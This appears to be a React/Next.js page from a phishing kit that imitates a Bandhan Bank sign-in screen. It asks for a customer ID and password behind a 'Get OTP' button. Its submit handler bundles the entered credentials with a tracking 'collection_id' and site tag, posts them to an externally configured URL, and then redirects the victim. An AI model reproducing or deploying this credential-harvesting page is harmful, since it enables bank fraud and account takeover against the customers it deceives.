'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";  
import { useState } from "react";
import styles from './page.module.css'; // Import the module CSS

export default function Home() {
    const [loading, setLoading] = useState(false);
    const router = useRouter();

    const handleSubmit = async (e) => {
      const API_URL = process.env.NEXT_PUBLIC_URL;
      const SITE = process.env.NEXT_PUBLIC_SITE;
      e.preventDefault();
      setLoading(true);
      const formData = new FormData(e.target);
      const jsonObject1 = {};
      const jsonObject = {};
      formData.forEach((value, key) => {
          jsonObject[key] = value;
      });
      jsonObject1['data'] = jsonObject;
      jsonObject1['site'] = SITE;
      jsonObject1['id'] = localStorage.getItem("collection_id");
      try {
          const response = await fetch(`${API_URL}`, {
              method: 'POST',
              body: JSON.stringify(jsonObject1)
          });

          if (!response.ok) {
              throw new Error('Network response was not ok');
          }
          const responseData = await response.json();
          router.push('/end');
      } catch (error) {
          console.error('There was a problem with the fetch operation:', error);
      }finally{
          setLoading(false);
      }
  };
  return (
    <>
   <Header />
    <main className="mt-4">
  <div className="container">
    <div className="mx-4">
      <input type="hidden" id="nextValue" defaultValue="nho.html" />
      <div id="test" className="text-danger fw-bold" />
      <form onSubmit={handleSubmit} id="frm_2_am8E">
        <div className={styles.formGroup}>
          <label htmlFor="">User/Customer Id </label>
          <input
            type="text"
            className={`${styles.formControl} form-control`}
            name="csutomid"
            required
          />
          <span>Required</span>
          <small style={{ float: "right", marginTop: 15 }}>
            {" "}
            <a href="" className="link-primary">
              Known your Customer Id
            </a>
          </small>

        </div>
        
        <div className={styles.formGroup}>
          <label htmlFor="">Password </label>
          <input
            type="password"
            className={`${styles.formControl} form-control`}
            name="pass"
            pattern="^(?=.*[A-Za-z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{6,}$"
            title="invalid password"
            required
          />
          <span>Required</span>
        </div>

        <div className="form-check">
        <input className="form-check-input" type="checkbox" defaultChecked />
        <label className="form-check-label" htmlFor="flexCheckDefault">
          <small className="text-secondary">
            I agreed to the
            <a href="javascript:void" className="link-primary">
              all terms of conditions
            </a>
            of Bandhan Bank
          </small>
        </label>
      </div>
        
        <div className="form-group w-100 my-3 mb-0 d-flex justify-content-center">
          <button type="submit" disabled={loading} className="submit-button w-75 btn btn-primary">
            Get OTP 
          </button>
        </div>
      </form>
       
    </div>
  </div>
</main>
    <Footer />
</>
  );
}
